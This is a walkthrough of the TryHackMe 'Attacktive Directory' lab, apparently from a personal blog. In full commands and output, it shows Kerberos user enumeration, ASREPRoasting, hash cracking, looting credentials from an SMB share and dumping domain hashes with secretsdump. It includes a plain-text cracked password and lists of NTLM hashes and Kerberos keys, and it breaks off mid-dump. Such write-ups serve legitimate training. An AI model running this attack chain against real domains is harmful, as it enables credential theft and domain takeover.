---
title: "Walk-through of Attacktive Directory from TryHackMe"
header:
  teaser: /assets/images/2021-03-28-21-01-52.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - enum4linux
  - kerbrute
  - hashcat
  - smbmap
  - secretsdump.py
  - Evil-WinRM
---

## Machine Information

![attacktive](/assets/images/2021-03-28-21-01-52.png)

Attacktive Directory is a medium difficulty room on TryHackMe. An initial nmap scan reveals a Windows domain controller, which we probe using enum4linux. We then use Kerbrute to discover users and ASREPRoasting to retrieve hashes. Cracking the hash of a user gives us access to a file share, where we find more credentials. We then use sercretsdump.py to gather more hashes, including the administrators. Finally we use Evil-WinRM to gain a shell as admin to grab the loot.

<!--more-->
Skills required are a basic understanding of Active Directory and the tools needed to attack it. Skills learned are Kerberoasting, ASREPRoating and retrieving hashes to use pass the hash attacks.

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) |
| Machine Release Date | 25th Nov 2019 |
| Date I Completed It | 24th March 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.49.67 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/thm/attacktive]
└─# nmap -p$ports -sC -sV -oA attacktive 10.10.49.67
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 22:31 GMT
Nmap scan report for 10.10.49.67
Host is up (0.027s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-03-22 22:31:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-03-22T22:32:26+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2021-03-21T22:28:19
|_Not valid after:  2021-09-20T22:28:19
|_ssl-date: 2021-03-22T22:32:34+00:00; +2s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-03-22T22:32:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.04 seconds
```

Lot's of open ports, and we can see the server is Windows based, with IIS 10 installed that suggests it's probably Server 2016. Before we get started let's add the servername to our hosts file:

```text
echo 10.10.49.67 spookysec.local >> /etc/hosts
```

## Task 3 - Enum4linux

As this is a Active Directory based room our starting point is to enumerate it remotely using enum4linux:

```text
└─# enum4linux -a spookysec.local     
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Mar 22 22:49:19 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... spookysec.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ======================================== 
|    Session Check on spookysec.local    |
 ======================================== 
[+] Server spookysec.local allows sessions using username '', password ''

 ============================================== 
|    Getting domain SID for spookysec.local    |
 ============================================== 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)

 ========================================= 
|    OS information on spookysec.local    |
 ========================================= 
[+] Got OS info for spookysec.local from smbclient: 
[+] Got OS info for spookysec.local from srvinfo:

 ============================================ 
|    Share Enumeration on spookysec.local    |
 ============================================ 
        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on spookysec.local
 ======================================================= 
|    Password Policy Information for spookysec.local    |
 ======================================================= 
[+] Attaching to spookysec.local using a NULL share
[+] Trying protocol 139/SMB...
        [!] Protocol failed: Cannot request session (Called Name:SPOOKYSEC.LOCAL)
[+] Trying protocol 445/SMB...
        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
[E] Failed to get password policy with rpcclient

 ========================================================================== 
|    Users on spookysec.local via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================== 
[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

enum4linux complete on Mon Mar 22 22:51:17 2021
```

We gather a lot of information from enum4linux, some of which helps us answer the questions for this task.

## Task 4 - Kerbrute

As directed by the room we next look at Kerbrute to gain us more intel on the Domain and users. Grab the binary from the ropnop GitHub repo [here](https://github.com/ropnop/kerbrute/) if you haven't got it already:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64                                  
--2021-03-23 21:13:26--  https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://github-releases.githubusercontent.com/168977645/e8ae4080-1eb1-11ea-8fea-0ea168fa4c79?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210323%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210323T211327Z&X-Amz-Expires=300&X-Amz-Signature=d5552f305d4e9d7ace1c41f08a45b44de2f90acc4e55fea407a0045f527a6bb0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=168977645&response-content-disposition=attachment%3B%20filename%3Dkerbrute_linux_amd64&response-content-type=application%2Foctet-stream [following]
--2021-03-23 21:13:27--  https://github-releases.githubusercontent.com/168977645/e8ae4080-1eb1-11ea-8fea-0ea168fa4c79?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210323%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210323T211327Z&X-Amz-Expires=300&X-Amz-Signature=d5552f305d4e9d7ace1c41f08a45b44de2f90acc4e55fea407a0045f527a6bb0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=168977645&response-content-disposition=attachment%3B%20filename%3Dkerbrute_linux_amd64&response-content-type=application%2Foctet-stream
Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.109.154, 185.199.110.154, 185.199.111.154, ...
Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.109.154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8286607 (7.9M) [application/octet-stream]
Saving to: ‘kerbrute_linux_amd64’

kerbrute_linux_amd64                                                100%[==================================================================================================================================================================>]   7.90M  21.8MB/s    in 0.4s    

2021-03-23 21:13:27 (21.8 MB/s) - ‘kerbrute_linux_amd64’ saved [8286607/8286607]
```

You'll also need to make it executable:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# chmod +x kerbrute_linux_amd64 
```

Next grab the provided userlist and passwords:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
--2021-03-23 21:22:44--  https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 744407 (727K) [text/plain]
Saving to: ‘userlist.txt’

userlist.txt                                                  100%[========================>] 726.96K  --.-KB/s    in 0.1s    

2021-03-23 21:22:44 (7.19 MB/s) - ‘userlist.txt’ saved [744407/744407]

┌──(root💀kali)-[~/thm/attacktive]
└─# wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
--2021-03-23 21:22:55--  https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 569236 (556K) [text/plain]
Saving to: ‘passwordlist.txt’

passwordlist.txt                                              100%[========================>] 555.89K  --.-KB/s    in 0.08s   

2021-03-23 21:22:56 (6.62 MB/s) - ‘passwordlist.txt’ saved [569236/569236]
```

Now we run kerbrute against the Domain Controller to gather valid usernames:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# ./kerbrute_linux_amd64 userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 -o kerb-user.txt
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/23/21 - Ronnie Flathers @ropnop

2021/03/23 21:26:54 >  Using KDC(s):
2021/03/23 21:26:54 >   spookysec.local:88

2021/03/23 21:26:54 >  [+] VALID USERNAME:       james@spookysec.local
2021/03/23 21:26:54 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/03/23 21:26:54 >  [+] VALID USERNAME:       James@spookysec.local
2021/03/23 21:26:54 >  [+] VALID USERNAME:       robin@spookysec.local
2021/03/23 21:26:55 >  [+] VALID USERNAME:       darkstar@spookysec.local
2021/03/23 21:26:56 >  [+] VALID USERNAME:       administrator@spookysec.local
2021/03/23 21:26:57 >  [+] VALID USERNAME:       backup@spookysec.local
2021/03/23 21:26:58 >  [+] VALID USERNAME:       paradox@spookysec.local
2021/03/23 21:27:02 >  [+] VALID USERNAME:       JAMES@spookysec.local
2021/03/23 21:27:03 >  [+] VALID USERNAME:       Robin@spookysec.local
2021/03/23 21:27:11 >  [+] VALID USERNAME:       Administrator@spookysec.local
2021/03/23 21:27:25 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/03/23 21:27:30 >  [+] VALID USERNAME:       Paradox@spookysec.local
2021/03/23 21:27:46 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/03/23 21:27:51 >  [+] VALID USERNAME:       ori@spookysec.local
2021/03/23 21:28:00 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/03/23 21:28:52 >  Done! Tested 100000 usernames (16 valid) in 118.452 seconds
```

The output of this tool has given us a list of valid users on the domain. We use the information found here to answer the questions for this task.

## Task 5 - ASREPRoasting

Now we have a list of valid users we can turn to Impacket and use the GetPNUsers script to see if any of them have the "Does not require Pre-Authentication" flag set.

First tidy output file from kerbrute:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# cat kerb-user.txt | sed 1,2d | awk '{ print $7 }' | cut -f2 -d" " | sed '$d' > usernames.txt
```

Now use that file with the GetNPUsers script:

```text
└─# GetNPUsers.py spookysec.local/ -no-pass -usersfile usernames.txt
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[-] User james@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:1ba18f806be0710fdabbf679bc10271c$4daed3c14bddd9e1dbd71473aedad8169e26d52b4d07b7c4999c88e9cf1b51a5b7e4ee625b21fd3363a4f938622ec09b9968bc71e66d92f995fd150067ba1575fb869b37c28e5d21b5ce107788c35506d38b9bc0e64f90677a51b6739dccdc62bc6290fa873e0fda697ae3e13ed13de984bb10cacf3d924a90bdc55e7ff77c1cc094a578009c5fbcf47d2b6df4cfebaa0cde31c9923db2eb1b944dde00bf654ef564370a8cbcb835e0b890d30bbb7738711b5e09b238567dfa345454cb3ef71235fed93c8471a97e0d66b3452fe029875d311790986e62fedfa574d69417eb7d0f6f5e8b27ac5d2c4cd8fb51c253c2fd7ad1
[-] User James@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN@spookysec.local doesn't have UF_DONT_REQUIRE_PREAUTH set
```

From this we can see that the user svc-admin is vulnerable, and we have retrieved a Kerberos ticket using it. Now we can try to crack it using Hashcat or John The Ripper.

For Hashcat we need to identify the hash type using [this](https://hashcat.net/wiki/doku.php?id=example_hashes) list, which is easy enough to match:

```text
18200	Kerberos 5 AS-REP etype 23	$krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05
```

Now we can use the provided password list to speed up the cracking:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# hashcat -m 18200 -a 0 svc-admin.hash passwordlist.txt --force                       

hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8850H CPU @ 2.60GHz, 1423/1487 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Host memory required for this attack: 99 MB

Dictionary cache built:
* Filename..: passwordlist.txt
* Passwords.: 70188
* Bytes.....: 569236
* Keyspace..: 70188
* Runtime...: 0 secs

$krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:1ba18f806be0710fdabbf679bc10271c$4daed3c14bddd9e1dbd71473aedad8169e26d52b4d07b7c4999c88e9cf1b51a5b7e4ee625b21fd3363a4f938622ec09b9968bc71e66d92f995fd150067ba1575fb869b37c28e5d21b5ce107788c35506d38b9bc0e64f90677a51b6739dccdc62bc6290fa873e0fda697ae3e13ed13de984bb10cacf3d924a90bdc55e7ff77c1cc094a578009c5fbcf47d2b6df4cfebaa0cde31c9923db2eb1b944dde00bf654ef564370a8cbcb835e0b890d30bbb7738711b5e09b238567dfa345454cb3ef71235fed93c8471a97e0d66b3452fe029875d311790986e62fedfa574d69417eb7d0f6f5e8b27ac5d2c4cd8fb51c253c2fd7ad1:<HIDDEN>

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.L...fd7ad1
Time.Started.....: Tue Mar 23 22:13:13 2021, (1 sec)
Time.Estimated...: Tue Mar 23 22:13:14 2021, (0 secs)
Guess.Base.......: File (passwordlist.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    72812 H/s (6.40ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8192/70188 (11.67%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/70188 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: m123456 -> whitey

Started: Tue Mar 23 22:12:29 2021
Stopped: Tue Mar 23 22:13:15 2021
```

It's easier with John as it will identify the hash type for you:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# john svc-admin.hash --wordlist=passwordlist.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>   ($krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2021-03-23 22:19) 33.33g/s 221866p/s 221866c/s 221866C/s horoscope..amy123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## Task 6 - smbmap

We are moving along nicely here. So with a username and password we can look at the SMB service we saw earlier when we enumerated with nmap:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# smbmap -H 10.10.85.191 -u svc-admin -p management2005
[+] IP: 10.10.85.191:445        Name: spookysec.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

This user has read access to a share called backup, sounds interesting let's have a look:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# smbmap -H 10.10.85.191 -u svc-admin -p management2005 -r backup
[+] IP: 10.10.85.191:445        Name: spookysec.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        backup                                                  READ ONLY
        .\backup\*
        dr--r--r--                0 Sat Apr  4 20:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 20:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 20:08:53 2020    backup_credentials.txt
```

In there we see some loot, let's grab it:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# smbmap -H 10.10.85.191 -u svc-admin -p management2005 -r backup -A 'backup'
[+] IP: 10.10.85.191:445        Name: spookysec.local                                   
[+] Starting search for files matching 'backup' on share backup.
[+] Match found! Downloading: backup\backup_credentials.txt

┌──(root💀kali)-[~/thm/attacktive]
└─# cat 10.10.85.191-backup__credentials.txt 
<HIDDEN>
```

We have a string which looks to be base64 encoded, let's decode it:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# base64 --decode 10.10.85.191-backup__credentials.txt
<HIDDEN>
```

Victory! We've now got credentials of another account.

## Task 7 - secretsdump.py

Moving on, we can use these new more priviledged credentials to dump the domain credentials for all accounts:

```text
┌──(root💀kali)-[~/thm/attacktive]
└─# secretsdump.py -just-dc backup@spookysec.local
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation
Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HIDDEN>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:fa9e2614a53312f8df3efa9476877f08:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
